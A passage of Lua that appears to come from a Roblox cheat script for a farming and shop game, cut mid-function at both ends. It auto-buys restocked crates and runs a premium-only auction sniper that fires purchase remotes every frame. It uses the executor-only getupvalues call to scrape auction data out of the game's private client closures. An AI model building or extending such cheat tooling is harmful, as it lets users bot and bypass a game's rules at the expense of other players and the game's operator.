		local V = Z.DataReplica.GetData("PurchasedThisRestock")
		if not V then
			return
		end
		local y = tonumber(Z.Money.GetSheckles()) or 0
		local j = V.Crates or V.Crate or {}
		local i = Z.TotalControl.ResolveCrateShopNamesTotalControl()
		if i == nil then
			i = {}
			for G in pairs(g.CrateShopDataList) do
				table.insert(i, G)
			end
		end
		for G, V in ipairs(i) do
			local i = Z.TotalControl.ResolveCrateShopSelectionTotalControl(V, g.AllCrateShopData[V])
			if i ~= nil then
				if i ~= true then
					continue
				end
			elseif not Y.ShopBuyer.IsSelectedShopBuyer(h.crate_shop_buy_selected, V) then
				continue
			end
			local c = Z.CrateData.GetCrateItemDetails(V)
			if not c then
				continue
			end
			local J = tonumber(c.price) or 0
			if J <= 0 then
				continue
			end
			local T = tonumber(Z.CrateData.GetCrateStockCurrent(V)) or 0
			local d = tonumber(j[V]) or 0
			local u = math.max(0, T - d)
			if u <= 0 then
				continue
			end
			local q = Y.ShopBuyer.GetSpendableShecklesShopBuyer("crate_shop", y)
			local E = math.min(u, math.floor(q / J))
			if E <= 0 then
				continue
			end
			for G = 1, E, 1 do
				if Y.ShopBuyer.GetSpendableShecklesShopBuyer("crate_shop", tonumber(Z.Money.GetSheckles()) or 0) < J then
					break
				end
				Y.CrateShop.BuyCrate(V)
				task.wait(.1)
				y = tonumber(Z.Money.GetSheckles()) or 0
			end
		end
	end
}
g.FastAuctionStatusText = ""
g.FastAuctionUiRefs = g.FastAuctionUiRefs or {}
Y.FastAuction = {
	StartedFastAuction = false;
	SnapshotRequestsInFlightFastAuction = 0;
	LastSnapshotRequestAtFastAuction = 0;
	LastSnapshotAtFastAuction = 0,
	LiveLotsFastAuction = {},
	LotsByIdFastAuction = {},
	StockFastAuction = {},
	PendingLotIdFastAuction = "";
	PendingAtFastAuction = 0;
	NextAttemptByLotFastAuction = {};
	AttemptCountFastAuction = 0,
	RejoinAfterPendingFastAuction = false,
	RejoinPendingFastAuction = false;
	LastManualRefreshAtFastAuction = 0,
	LastControllerCacheReadAtFastAuction = 0,
	RollIntervalSecondsFastAuction = 0,
	RollWindowUnixFastAuction = 0;
	TimerShiftSecondsFastAuction = 0,
	EndedPriceByLotFastAuction = {};
	GetServerTimeFastAuction = function()
		local G, V = pcall(function()
			return y.Workspace:GetServerTimeNow()
		end)
		if G and type(V) == "number" then
			return V
		end
		return os.time()
	end;
	FormatTimerFastAuction = function(G)
		G = math.max(math.floor(tonumber(G) or 0), 0)
		local V = G / 60
		local y = G % 60
		if V < 60 then
			return string.format("%dm %02ds", V, y)
		end
		local Z = V / 60
		return string.format("%dh %dm", Z, V % 60)
	end;
	GetNextRefreshSecondsFastAuction = function(G)
		local V = tonumber(Y.FastAuction.RollIntervalSecondsFastAuction) or 0
		local y = tonumber(Y.FastAuction.RollWindowUnixFastAuction) or 0
		if V <= 0 or y <= 0 then
			return nil
		end
		G = tonumber(G) or Y.FastAuction.GetServerTimeFastAuction()
		local Z = tonumber(Y.FastAuction.TimerShiftSecondsFastAuction) or 0
		return math.max(((y + V) + Z) - G, 0)
	end;
	GetDisplayNameFastAuction = function(G)
		if type(G) ~= "table" then
			return "Unknown"
		end
		local V = tostring(G.displayName or "")
		if V ~= "" then
			return V
		end
		local y = {}
		for G, V in ipairs({
			G.type,
			G.size;
			G.mutation,
			G.item
		}) do
			V = tostring(V or "")
			if V ~= "" then
				y[# y + 1] = V
			end
		end
		if # y == 0 then
			return "Unknown"
		end
		return table.concat(y, " ")
	end;
	GetCurrentPriceFastAuction = function(G, V)
		if type(G) ~= "table" then
			return 0
		end
		local y = math.max(tonumber(G.startPrice) or 0, 0)
		local Z = math.max(tonumber(G.minPrice) or 0, 0)
		local j = tonumber(G.decrementIntervalSeconds) or 0
		if j <= 0 then
			return y
		end
		V = tonumber(V) or Y.FastAuction.GetServerTimeFastAuction()
		local i = math.max(V - ((tonumber(G.rolledAt) or V)), 0)
		local c = math.floor(i / j)
		local J = math.round((y * ((tonumber(G.decrementPercent) or 0))) / 100)
		return math.max(y - J * c, Z)
	end;
	GetDiscountPercentFastAuction = function(G, V)
		local y = 0
		if type(G) == "table" then
			y = tonumber(G.startPrice) or 0
		end
		if y <= 0 then
			return 0
		end
		local Z = ((((y - ((tonumber(V) or 0)))) / y)) * 100
		return math.clamp(Z, 0, 100)
	end;
	GetStockFastAuction = function(G)
		if type(G) ~= "table" then
			return 0
		end
		local V = tostring(G.lotId or "")
		local y = Y.FastAuction.StockFastAuction[V]
		if type(y) == "number" then
			return y
		end
		if G.stockQuantity == nil then
			return nil
		end
		return tonumber(G.stockQuantity) or 0
	end,
	IsActiveLotFastAuction = function(G, V)
		if type(G) ~= "table" then
			return false
		end
		V = tonumber(V) or Y.FastAuction.GetServerTimeFastAuction()
		if ((tonumber(G.expiresAt) or 0)) <= V then
			return false
		end
		local y = Y.FastAuction.GetStockFastAuction(G)
		return y == nil or y > 0
	end,
	SetStatusFastAuction = function(G, V)
		G = tostring(G or "")
		V = tostring(V or "#FFFFFF")
		local y = ""
		if G ~= "" then
			y = string.format("<font color=\'%s\'>%s</font>", V, G)
		end
		if g.FastAuctionStatusText == y then
			return false
		end
		g.FastAuctionStatusText = y
		local Z = g.FastAuctionUiRefs.StatusLabel
		if Z and type(Z.SetText) == "function" then
			Z:SetText(y ~= "" and y or "<font color=\'#888888\'>Ready.</font>")
		end
		return true
	end;
	RefreshAttemptLabelFastAuction = function()
		local G = g.FastAuctionUiRefs.AttemptLabel
		if not G or type(G.SetText) ~= "function" then
			return false
		end
		local V = math.clamp(math.floor(tonumber(h.fast_auction_rejoin_attempts) or 10), 1, 10000)
		G:SetText(string.format("Purchase attempts: <font color=\'#FFCC66\'>%d/%d</font>", Y.FastAuction.AttemptCountFastAuction, V))
		return true
	end,
	ApplySnapshotFastAuction = function(G)
		if type(G) ~= "table" or type(G.manifest) ~= "table" or type(G.manifest.lots) ~= "table" then
			return false
		end
		local V = {}
		local y = {}
		for G, Z in pairs(G.manifest.lots) do
			if type(Z) == "table" and (type(Z.lotId) == "string" and Z.lotId ~= "") then
				V[# V + 1] = Z
				y[Z.lotId] = Z
			end
		end
		Y.FastAuction.LiveLotsFastAuction = V
		Y.FastAuction.LotsByIdFastAuction = y
		for G in pairs(Y.FastAuction.EndedPriceByLotFastAuction) do
			if y[G] == nil then
				Y.FastAuction.EndedPriceByLotFastAuction[G] = nil
			end
		end
		if type(G.stock) == "table" then
			Y.FastAuction.StockFastAuction = G.stock
		end
		local Z = tonumber(G.rollIntervalSeconds)
		if Z and Z > 0 then
			Y.FastAuction.RollIntervalSecondsFastAuction = Z
		end
		local j = tonumber(G.rollWindowUnix)
		if j and j > 0 then
			Y.FastAuction.RollWindowUnixFastAuction = j
		end
		local i = tonumber(G.timerShiftSeconds)
		if i then
			Y.FastAuction.TimerShiftSecondsFastAuction = i
		end
		Y.FastAuction.LastSnapshotAtFastAuction = os.clock()
		Y.FastAuction.RefreshManualButtonsFastAuction(true)
		Y.FastAuction.EvaluateAutoFastAuction()
		return true
	end;
	ApplyStockUpdateFastAuction = function(G)
		if type(G) ~= "table" or type(G.stock) ~= "table" then
			return false
		end
		Y.FastAuction.StockFastAuction = G.stock
		Y.FastAuction.RefreshManualButtonsFastAuction(true)
		Y.FastAuction.EvaluateAutoFastAuction()
		return true
	end;
	BootstrapControllerCacheFastAuction = function()
		local G = os.clock()
		local V = Y.FastAuction.LastControllerCacheReadAtFastAuction
		if V > 0 and G - V < 2 then
			return false
		end
		Y.FastAuction.LastControllerCacheReadAtFastAuction = G
		local Z = getupvalues
		if type(Z) ~= "function" and type(debug) == "table" then
			Z = debug.getupvalues
		end
		if type(Z) ~= "function" then
			return false
		end
		local j = y.Networking and y.Networking.Auctioneer
		if type(j) ~= "table" then
			return false
		end
		local i = {}
		local c = {}
		local function J(G)
			if type(G) ~= "table" or G.Type ~= "Signal" then
				return
			end
			local V = G.Next
			local y = 0
			while type(V) == "table" and (V ~= G and y < 100) do
				y += 1
				if V.Type == "Connection" and type(V.Function) == "function" then
					local G, y = pcall(Z, V.Function)
					if G and type(y) == "table" then
						c[# c + 1] = y
						for G, V in pairs(y) do
							if type(V) == "table" then
								i[# i + 1] = V
							end
						end
					end
				end
				V = V.Next
			end
		end
		J(j.Snapshot and j.Snapshot.OnClientEvent)
		J(j.StockUpdate and j.StockUpdate.OnClientEvent)
		local T = nil
		local d = 0
		for G, V in ipairs(i) do
			local y = 0
			for G, V in pairs(V) do
				if type(V) == "table" and (type(V.lotId) == "string" and V.lotId ~= "") then
					y += 1
				end
			end
			if y > d then
				d = y
				T = V
			end
		end
		if type(T) ~= "table" or d <= 0 then
			return false
		end
		local u = nil
		local q = 0
		for G, V in ipairs(i) do
			if V ~= T then
				local G = 0
				for y, Z in pairs(T) do
					if type(Z) == "table" and (type(Z.lotId) == "string" and type(V[Z.lotId]) == "number") then
						G += 1
					end
				end
				if G > q then
					q = G
					u = V
				end
			end
		end
		if type(u) ~= "table" or q <= 0 then
			return false
		end
		local g = {}
		for G, V in pairs(u) do
			g[G] = V
		end
		local E = nil
		for G, V in ipairs(c) do
			for G, y in pairs(V) do
				if y == T then
					E = V
					break
				end
			end
			if E then
				break
			end
		end
		local a = 0
		local H = 0
		local r = 0
		if type(E) == "table" then
			for G, V in pairs(E) do
				if type(V) == "number" then
					if V > 1000000000 then
						H = V
					elseif V > 0 and (V <= 86400 and V > a) then
						a = V
					elseif V ~= a and math.abs(V) <= 86400 then
						r = V
					end
				end
			end
		end
		if H <= 0 then
			for G, V in pairs(T) do
				local y = tonumber((tostring(V.lotId or "")):match("^auction:(%d+):"))
				if y and y > 0 then
					H = y
					break
				end
			end
		end
		local e = {
			manifest = {
				lots = T
			};
			stock = g
		}
		if a > 0 then
			e.rollIntervalSeconds = a
		end
		if H > 0 then
			e.rollWindowUnix = H
		end
		e.timerShiftSeconds = r
		return Y.FastAuction.ApplySnapshotFastAuction(e)
	end;
	RequestSnapshotFastAuction = function(G)
		local V = os.clock()
		if G ~= true and V - Y.FastAuction.LastSnapshotRequestAtFastAuction < .75 then
			return false
		end
		if Y.FastAuction.SnapshotRequestsInFlightFastAuction >= 2 then
			return false
		end
		local Z = y.Networking and (y.Networking.Auctioneer and y.Networking.Auctioneer.RequestSnapshot)
		if not Z or type(Z.Fire) ~= "function" then
			Y.FastAuction.SetStatusFastAuction("Auction data is unavailable.", "#FF6666")
			return false
		end
		Y.FastAuction.LastSnapshotRequestAtFastAuction = V
		Y.FastAuction.SnapshotRequestsInFlightFastAuction += 1
		task.spawn(function()
			local G, V = pcall(function()
				return Z:Fire()
			end)
			Y.FastAuction.SnapshotRequestsInFlightFastAuction = math.max(Y.FastAuction.SnapshotRequestsInFlightFastAuction - 1, 0)
			if G and type(V) == "table" then
				Y.FastAuction.ApplySnapshotFastAuction(V)
			elseif # Y.FastAuction.LiveLotsFastAuction == 0 then
				local G = Y.FastAuction.BootstrapControllerCacheFastAuction()
				if not G then
					Y.FastAuction.SetStatusFastAuction("Waiting for live auction items...", "#FFCC66")
				end
			end
		end)
		return true
	end;
	EnsureManualButtonsFastAuction = function(G)
		local V = g.FastAuctionUiRefs
		local y = V.ManualGroup
		if not y then
			return false
		end
		V.ManualButtons = V.ManualButtons or {}
		for G = # V.ManualButtons + 1, G, 1 do
			local Z = G
			local j = {
				lotId = ""
			}
			j.Button = y:AddButton({
				Text = "Waiting for item...",
				Tooltip = "Purchases this live auction item immediately at its current price.",
				Func = function()
					local G = g.FastAuctionUiRefs.ManualButtons and g.FastAuctionUiRefs.ManualButtons[Z]
					if G then
						Y.FastAuction.PurchaseLotByIdFastAuction(G.lotId, "manual")
					end
				end
			})
			if g.GetCheckIfPro() ~= true and (j.Button and type(j.Button.SetDisabled) == "function") then
				j.Button:SetDisabled(true)
			end
			if j.Button and type(j.Button.SetVisible) == "function" then
				j.Button:SetVisible(false)
			end
			V.ManualButtons[Z] = j
		end
		return true
	end;
	RefreshManualButtonsFastAuction = function(G)
		local V = g.FastAuctionUiRefs
		if not V.ManualGroup then
			return false
		end
		local y = os.clock()
		if G ~= true and y - Y.FastAuction.LastManualRefreshAtFastAuction < .1 then
			return false
		end
		Y.FastAuction.LastManualRefreshAtFastAuction = y
		local Z = Y.FastAuction.GetServerTimeFastAuction()
		local j = {}
		local i = 0
		for G, V in ipairs(Y.FastAuction.LiveLotsFastAuction) do
			if V.robuxPrice == nil then
				j[# j + 1] = V
				if Y.FastAuction.IsActiveLotFastAuction(V, Z) then
					i += 1
				end
			end
		end
		table.sort(j, function(G, V)
			local y = Y.FastAuction.IsActiveLotFastAuction(G, Z)
			local j = Y.FastAuction.IsActiveLotFastAuction(V, Z)
			if y ~= j then
				return y
			end
			local i = Y.FastAuction.GetCurrentPriceFastAuction(G, Z)
			local c = Y.FastAuction.GetCurrentPriceFastAuction(V, Z)
			if i ~= c then
				return i > c
			end
			return tostring(G.lotId or "") < tostring(V.lotId or "")
		end)
		Y.FastAuction.EnsureManualButtonsFastAuction(# j)
		local c = V.ManualButtons or {}
		for G, V in ipairs(c) do
			local y = j[G]
			if y then
				local G = Y.FastAuction.GetCurrentPriceFastAuction(y, Z)
				local j = math.max(math.floor(tonumber(y.count) or 1), 1)
				local i = Y.FastAuction.GetDisplayNameFastAuction(y)
				if j > 1 then
					i = string.format("%s x%d", i, j)
				end
				local c = Y.FastAuction.IsActiveLotFastAuction(y, Z)
				local J = tostring(y.lotId or "")
				if c then
					Y.FastAuction.EndedPriceByLotFastAuction[J] = nil
				else
					local V = Y.FastAuction.EndedPriceByLotFastAuction[J]
					if type(V) == "number" then
						G = V
					else
						Y.FastAuction.EndedPriceByLotFastAuction[J] = G
					end
				end
				local T = ""
				local d = Y.FastAuction.GetStockFastAuction(y)
				if type(d) == "number" and d <= 0 then
					T = "  [SOLD OUT]"
				elseif ((tonumber(y.expiresAt) or 0)) <= Z then
					T = "  [EXPIRED]"
				end
				if c then
					V.lotId = y.lotId
				else
					V.lotId = ""
				end
				if V.Button and type(V.Button.SetText) == "function" then
					V.Button:SetText(string.format("%s  $%s%s", i, E.Currency.FormatMoney(G), T))
				end
				if V.Button and type(V.Button.SetDisabled) == "function" then
					V.Button:SetDisabled(g.GetCheckIfPro() ~= true or not c)
				end
				if V.Button and type(V.Button.SetVisible) == "function" then
					V.Button:SetVisible(true)
				end
			else
				V.lotId = ""
				if V.Button and type(V.Button.SetVisible) == "function" then
					V.Button:SetVisible(false)
				end
			end
		end
		local J = V.ManualStatusLabel
		if J and type(J.SetText) == "function" then
			local G = # j - i
			local V = Y.FastAuction.GetNextRefreshSecondsFastAuction(Z)
			local y = "Next refresh: --"
			if V ~= nil then
				if V <= 0 then
					y = "Refreshing..."
				else
					y = "Next refresh in " .. Y.FastAuction.FormatTimerFastAuction(V)
				end
			end
			if # j > 0 then
				J:SetText(string.format("<font color=\'#7CFC00\'>%d live</font> | <font color=\'#888888\'>%d ended</font><br/><font color=\'#FFCC66\'>%s</font>", i, G, y))
			else
				J:SetText(string.format("<font color=\'#888888\'>Waiting for auction items.</font><br/><font color=\'#FFCC66\'>%s</font>", y))
			end
		end
		return true
	end;
	GetBestAffordableLotFastAuction = function()
		local G = Y.FastAuction.GetServerTimeFastAuction()
		local V = tonumber(Z.Money.GetSheckles()) or 0
		local y = math.clamp(tonumber(h.fast_auction_min_percent) or 50, 0, 100)
		local j = nil
		local i = - 1
		local c = os.clock()
		for Z, J in ipairs(Y.FastAuction.LiveLotsFastAuction) do
			local T = tostring(J.lotId or "")
			if T == "" or J.robuxPrice ~= nil then
				continue
			end
			if c < ((tonumber(Y.FastAuction.NextAttemptByLotFastAuction[T]) or 0)) then
				continue
			end
			if not Y.FastAuction.IsActiveLotFastAuction(J, G) then
				continue
			end
			local d = Y.FastAuction.GetCurrentPriceFastAuction(J, G)
			local u = Y.FastAuction.GetDiscountPercentFastAuction(J, d)
			if d <= V and (u >= y and d > i) then
				j = J
				i = d
			end
		end
		return j
	end,
	ClearPendingPurchaseFastAuction = function()
		Y.FastAuction.PendingLotIdFastAuction = ""
		Y.FastAuction.PendingAtFastAuction = 0
	end,
	PurchaseLotByIdFastAuction = function(G, V)
		G = tostring(G or "")
		V = tostring(V or "manual")
		if g.GetCheckIfPro() ~= true then
			g.Notify("Premium is required for Fast Auction", 3)
			return false
		end
		if G == "" then
			return false
		end
		if Y.FastAuction.PendingLotIdFastAuction ~= "" then
			return false
		end
		local j = Y.FastAuction.LotsByIdFastAuction[G]
		local i = Y.FastAuction.GetServerTimeFastAuction()
		if type(j) ~= "table" or j.robuxPrice ~= nil or not Y.FastAuction.IsActiveLotFastAuction(j, i) then
			Y.FastAuction.SetStatusFastAuction("That item is no longer available.", "#FF6666")
			Y.FastAuction.RequestSnapshotFastAuction(true)
			return false
		end
		local c = Y.FastAuction.GetCurrentPriceFastAuction(j, i)
		local J = tonumber(Z.Money.GetSheckles()) or 0
		if c > J then
			Y.FastAuction.SetStatusFastAuction("Not enough sheckles for " .. (Y.FastAuction.GetDisplayNameFastAuction(j) .. "."), "#FF6666")
			return false
		end
		local T = y.Networking and (y.Networking.Auctioneer and y.Networking.Auctioneer.PurchaseLot)
		if not T or type(T.Fire) ~= "function" then
			Y.FastAuction.SetStatusFastAuction("Auction purchase is unavailable.", "#FF6666")
			return false
		end
		Y.FastAuction.PendingLotIdFastAuction = G
		Y.FastAuction.PendingAtFastAuction = os.clock()
		Y.FastAuction.NextAttemptByLotFastAuction[G] = os.clock() + .2
		local d = pcall(function()
			T:Fire(G, c)
		end)
		if not d then
			Y.FastAuction.ClearPendingPurchaseFastAuction()
			Y.FastAuction.SetStatusFastAuction("Purchase request failed.", "#FF6666")
			return false
		end
		Y.FastAuction.SetStatusFastAuction("Buying " .. (Y.FastAuction.GetDisplayNameFastAuction(j) .. "..."), "#FFCC66")
		return true
	end;
	HandlePurchaseResultFastAuction = function(G, V, y)
		G = tostring(G or "")
		if G == "" or G ~= Y.FastAuction.PendingLotIdFastAuction then
			return false
		end
		local Z = Y.FastAuction.LotsByIdFastAuction[G]
		local j = Y.FastAuction.GetDisplayNameFastAuction(Z)
		Y.FastAuction.ClearPendingPurchaseFastAuction()
		if V == true then
			local V = Y.FastAuction.GetStockFastAuction(Z)
			if type(V) == "number" then
				Y.FastAuction.StockFastAuction[G] = math.max(V - 1, 0)
			end
			Y.FastAuction.NextAttemptByLotFastAuction[G] = os.clock() + .05
			Y.FastAuction.SetStatusFastAuction("Bought " .. (j .. "."), "#7CFC00")
		else
			Y.FastAuction.NextAttemptByLotFastAuction[G] = os.clock() + .35
			local V = tostring(y or "Purchase rejected")
			Y.FastAuction.SetStatusFastAuction(V, "#FF6666")
		end
		Y.FastAuction.RefreshManualButtonsFastAuction(true)
		task.defer(Y.FastAuction.EvaluateAutoFastAuction)
		return V == true
	end,
	CheckPendingTimeoutFastAuction = function()
		if Y.FastAuction.PendingLotIdFastAuction == "" then
			return false
		end
		if os.clock() - Y.FastAuction.PendingAtFastAuction < 2 then
			return false
		end
		local G = Y.FastAuction.PendingLotIdFastAuction
		Y.FastAuction.ClearPendingPurchaseFastAuction()
		Y.FastAuction.NextAttemptByLotFastAuction[G] = os.clock() + .35
		Y.FastAuction.SetStatusFastAuction("Purchase result timed out.", "#FF6666")
		return true
	end;
	EvaluateAutoFastAuction = function()
		if h.fast_auction_enabled ~= true or g.GetCheckIfPro() ~= true then
			return false
		end
		Y.FastAuction.CheckPendingTimeoutFastAuction()
		if Y.FastAuction.PendingLotIdFastAuction ~= "" then
			return false
		end
		if # Y.FastAuction.LiveLotsFastAuction == 0 then
			Y.FastAuction.RequestSnapshotFastAuction(false)
			Y.FastAuction.SetStatusFastAuction("Waiting for live auction items...", "#FFCC66")
			return false
		end
		local G = Y.FastAuction.GetBestAffordableLotFastAuction()
		if not G then
			Y.FastAuction.SetStatusFastAuction("Watching affordable live items.", "#CFCFCF")
			return false
		end
		return Y.FastAuction.PurchaseLotByIdFastAuction(G.lotId, "auto")
	end;
	StartFastAuction = function()
		if Y.FastAuction.StartedFastAuction then
			return false
		end
		local G = y.Networking and y.Networking.Auctioneer
		if type(G) ~= "table" then
			return false
		end
		Y.FastAuction.StartedFastAuction = true
		if G.Snapshot and G.Snapshot.OnClientEvent then
			G.Snapshot.OnClientEvent:Connect(Y.FastAuction.ApplySnapshotFastAuction)
		end
		if G.StockUpdate and G.StockUpdate.OnClientEvent then
			G.StockUpdate.OnClientEvent:Connect(Y.FastAuction.ApplyStockUpdateFastAuction)
		end
		if G.PurchaseResult and G.PurchaseResult.OnClientEvent then
			G.PurchaseResult.OnClientEvent:Connect(Y.FastAuction.HandlePurchaseResultFastAuction)
		end
		Y.FastAuction.RequestSnapshotFastAuction(true)
		y.RunService.Heartbeat:Connect(function()
			if g.is_forced_stop then
				return
			end
			Y.FastAuction.EvaluateAutoFastAuction()
			Y.FastAuction.RefreshManualButtonsFastAuction(false)
		end)
		task.spawn(function()
			while Y.FastAuction.StartedFastAuction and not g.is_forced_stop do
				local G = os.clock() - Y.FastAuction.LastSnapshotAtFastAuction
				local V = 3
				if Y.FastAuction.LastSnapshotAtFastAuction == 0 or G >= V then
					Y.FastAuction.RequestSnapshotFastAuction(false)
				end
				task.wait(1)
			end
		end)
		return true
	end
}
g.AuctioneerStatusText = ""
g.AuctioneerLogs = g.AuctioneerLogs or {}
g.AuctioneerUiRefs = g.AuctioneerUiRefs or {}
Y.Auctioneer = {
	StartedAuctioneer = false,
	RequestingSnapshotAuctioneer = false;
	PurchaseBusyAuctioneer = false;
	NextPurchaseAtAuctioneer = 0;
	LastSnapshotAtAuctioneer = 0;
	LastSnapshotRequestAtAuctioneer = 0,
	RestockKeyAuctioneer = "",
	LiveLotsAuctioneer = {},
	StockAuctioneer = {},
	KnownItemsAuctioneer = {};
	BoughtByItemAuctioneer = {},
	BoughtByLotAuctioneer = {},
	StartedSnapshotRetryAuctioneer = false,
	PurchaseTimeoutAtAuctioneer = 0,
	PreviewLogKeysAuctioneer = {},
	IsEnabledAuctioneer = function()
		local G = Z.TotalControl.ResolveAuctioneerEnabledTotalControl()
		if G ~= nil then
			return G == true
		end
		return g.GetCheckIfPro() == true and h.auctioneer_enabled == true
	end,
	GetServerTimeAuctioneer = function()
		local G, V = pcall(function()
			return y.Workspace:GetServerTimeNow()
		end)
		return G and tonumber(V) or os.time()
	end,
	SetStatusAuctioneer = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.AuctioneerStatusText = ""
			return false
		end
		g.AuctioneerStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\148\168 [Auctioneer]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end;
	SyncFastAuctionDataAuctioneer = function(G)
		local V = Y.FastAuction
		if type(V) ~= "table" then
			return false
		end
		local y = V.LiveLotsFastAuction
		local Z = V.StockFastAuction
		if type(y) ~= "table" or type(Z) ~= "table" then
			return false
		end
		Y.Auctioneer.LiveLotsAuctioneer = y
		Y.Auctioneer.StockAuctioneer = Z
		Y.Auctioneer.LastSnapshotAtAuctioneer = tonumber(V.LastSnapshotAtFastAuction) or 0
		local j = tostring(V.RollWindowUnixFastAuction or "")
		if j ~= "" and j ~= Y.Auctioneer.RestockKeyAuctioneer then
			Y.Auctioneer.RestockKeyAuctioneer = j
			table.clear(Y.Auctioneer.BoughtByItemAuctioneer)
			table.clear(Y.Auctioneer.BoughtByLotAuctioneer)
			table.clear(Y.Auctioneer.PreviewLogKeysAuctioneer)
		end
		if G == true then
			Y.Auctioneer.RefreshItemDropdownAuctioneer()
			Y.Auctioneer.RefreshLiveLotsAuctioneer()
		end
		return # y > 0
	end,
	AddLogAuctioneer = function(G, V)
		G = tostring(G or "")
		if G == "" then
			return false
		end
		local y = os.date("%H:%M:%S")
		table.insert(g.AuctioneerLogs, 1, {
			text = string.format("%s  %s", y, G);
			colour = tostring(V or "#CFCFCF")
		})
		while # g.AuctioneerLogs > 25 do
			table.remove(g.AuctioneerLogs)
		end
		Y.Auctioneer.RefreshLogsAuctioneer()
		return true
	end,
	SelectionHasAuctioneer = function(G, V)
		V = tostring(V or "")
		if V == "" or type(G) ~= "table" then
			return false
		end
		if G[V] == true then
			return true
		end
		for G, y in pairs(G) do
			if tostring(y or "") == V then
				return true
			end
		end
		return false
	end,
	CopySelectionAuctioneer = function(G)
		local V = {}
		if type(G) ~= "table" then
			return V
		end
		for G, y in pairs(G) do
			if type(G) == "string" and (G ~= "" and y == true) then
				V[G] = true
			elseif type(y) == "string" and y ~= "" then
				V[y] = true
			end
		end
		return V
	end,
	AddKnownItemAuctioneer = function(G, V, y, j)
		V = tostring(V or "")
		if V == "" or G[V] then
			return false
		end
		y = tostring(y or "Unknown")
		j = tostring(j or "Unknown")
		local i = Z.Data.GetRarityColor(j)
		local c = string.format("<font color=\'#FFFFFF\'>%s</font> <font color=\'#CFCFCF\'>%s</font>", V, y)
		if j ~= "" and j ~= "Unknown" then
			c = string.format("%s <font color=\'%s\'>%s</font>", c, i, j)
		end
		G[V] = {
			Text = c,
			Value = V,
			Category = y;
			Rank = g.RarityRank[j] or 0
		}
		return true
	end;
	GetItemDropdownAuctioneer = function()
		local G = {}
		for V, y in ipairs(g.AllSeedsDataTable or {}) do
			Y.Auctioneer.AddKnownItemAuctioneer(G, y.name, "Seeds", y.rarity)
		end
		for V, y in ipairs(g.AllGearShopTable or {}) do
			Y.Auctioneer.AddKnownItemAuctioneer(G, y.name, tostring(y.type or "Gear"), y.rarity)
		end
		for V, y in ipairs(g.AllCrateShopTable or {}) do
			Y.Auctioneer.AddKnownItemAuctioneer(G, y.name, "Crates", y.rarity)
		end
		if type(y.PetLureData) == "table" then
			local V = type(y.PetLureData.Order) == "table" and y.PetLureData.Order or {}
			for V, Z in ipairs(V) do
				local j = type(y.PetLureData.Get) == "function" and y.PetLureData.Get(Z) or nil
				local i = type(j) == "table" and j.DisplayName or Z
				Y.Auctioneer.AddKnownItemAuctioneer(G, i, "PetLures", type(j) == "table" and j.HuntType or "Unknown")
			end
		end
		if type(y.EggData) == "table" and type(y.EggData.Data) == "table" then
			for V, y in ipairs(y.EggData.Data) do
				if type(y) == "table" then
					Y.Auctioneer.AddKnownItemAuctioneer(G, y.EggName, "Eggs", y.Rarity)
				end
			end
		end
		if type(y.SeedPackData) == "table" and type(y.SeedPackData.Data) == "table" then
			for V, y in ipairs(y.SeedPackData.Data) do
				if type(y) == "table" then
					Y.Auctioneer.AddKnownItemAuctioneer(G, y.PackName, "SeedPacks", y.Rarity)
				end
			end
		end
		if type(y.PetData) == "table" then
			for V, y in pairs(y.PetData) do
				if type(V) == "string" and (V ~= "" and type(y) == "table") then
					Y.Auctioneer.AddKnownItemAuctioneer(G, tostring(y.DisplayName or V), "Pets", y.Rarity)
					Y.Auctioneer.AddKnownItemAuctioneer(G, V, "Pets", y.Rarity)
				end
			end
		end
		for V, y in ipairs(Y.Auctioneer.LiveLotsAuctioneer) do
			if type(y) == "table" then
				local V = Y.Auctioneer.GetDisplayNameAuctioneer(y)
				Y.Auctioneer.AddKnownItemAuctioneer(G, tostring(y.item or V), tostring(y.category or "Auction"), Y.Auctioneer.ResolveRarityAuctioneer(y))
				Y.Auctioneer.AddKnownItemAuctioneer(G, V, tostring(y.category or "Auction"), Y.Auctioneer.ResolveRarityAuctioneer(y))
			end
		end
		local V = {}
		for G, y in pairs(G) do
			table.insert(V, y)
		end
		table.sort(V, function(G, V)
			if tostring(G.Category or "") ~= tostring(V.Category or "") then
				return tostring(G.Category or "") < tostring(V.Category or "")
			end
			if ((G.Rank or 0)) ~= ((V.Rank or 0)) then
				return ((G.Rank or 0)) > ((V.Rank or 0))
			end
			return tostring(G.Value or "") < tostring(V.Value or "")
		end)
		return V
	end;
	GetSupportedCategoriesAuctioneer = function()
		local G = {}
		local V = {}
		local Z = y.MailboxItemCatalog
		local j = type(Z) == "table" and Z.Categories or nil
		if type(j) == "table" then
			for y, Z in ipairs(j) do
				Z = tostring(Z or "")
				if Z ~= "" and not G[Z] then
					G[Z] = true
					table.insert(V, Z)
				end
			end
		end
		for y, Z in ipairs(Y.Auctioneer.LiveLotsAuctioneer) do
			local j = tostring(type(Z) == "table" and Z.category or "")
			if j ~= "" and not G[j] then
				G[j] = true
				table.insert(V, j)
			end
		end
		table.sort(V)
		return V
	end,
	GetDisplayNameAuctioneer = function(G)
		if type(G) ~= "table" then
			return "Unknown"
		end
		if type(y.Auctioneer) == "table" and type(y.Auctioneer.DisplayName) == "function" then
			local V, Z = pcall(y.Auctioneer.DisplayName, G)
			if V and (type(Z) == "string" and Z ~= "") then
				return Z
			end
		end
		return tostring(G.displayName or G.item or "Unknown")
	end,
	ResolveRarityAuctioneer = function(G)
		if type(G) ~= "table" then
			return "Unknown"
		end
		local V = y.MailboxItemCatalog
		if type(V) == "table" and type(V.ResolveRarity) == "function" then
			local y, Z = pcall(V.ResolveRarity, G.category, G.item)
			if y and (type(Z) == "string" and Z ~= "") then
				return Z
			end
		end
		if G.category == "Seeds" or G.category == "HarvestedFruits" then
			local V = g.SeedDataFast and g.SeedDataFast[G.item]
			if type(V) == "table" and type(V.rarity) == "string" then
				return V.rarity
			end
		end
		if G.category == "Pets" and type(y.PetData) == "table" then
			local V = y.PetData[G.item]
			if type(V) == "table" and type(V.Rarity) == "string" then
				return V.Rarity
			end
		end
		return "Unknown"
	end;
	GetCurrentPriceAuctioneer = function(G)
		if type(G) ~= "table" then
			return 0
		end
		if type(y.Auctioneer) == "table" and type(y.Auctioneer.CurrentPrice) == "function" then
			local V, Z = pcall(y.Auctioneer.CurrentPrice, G, Y.Auctioneer.GetServerTimeAuctioneer())
			if V and type(Z) == "number" then
